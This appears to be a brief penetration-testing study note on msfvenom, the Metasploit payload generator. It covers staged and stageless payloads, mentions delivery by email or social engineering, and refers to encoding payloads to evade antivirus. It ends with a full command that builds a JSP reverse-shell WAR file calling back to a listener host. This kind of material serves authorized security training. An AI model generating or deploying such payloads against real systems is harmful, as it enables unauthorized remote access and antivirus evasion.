# Crafting Payloads with MSFvenom

msfvenom is used to craft a payload and send it via email or social engineering. Also able to encrypt & encode the payload in order to bypass antivirus detection

msfvenom -l payloads

## Staged

Staged : a stage is executed on the target and then call back to the attack box
-> example : linux/x86/shell/reverse_tcp is a staged payload with a first stage shell/ and then reverse_tcp

## Stageless

Stageless : payloads without stages (better for environments with low bandwidth and latency AND better to escape detection)
-> example : /linux/zarch/meterpreter_reverse_tcp is a stageless with all shell AND network communication within the same function meterpreter_reverse_tcp

msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o root.war
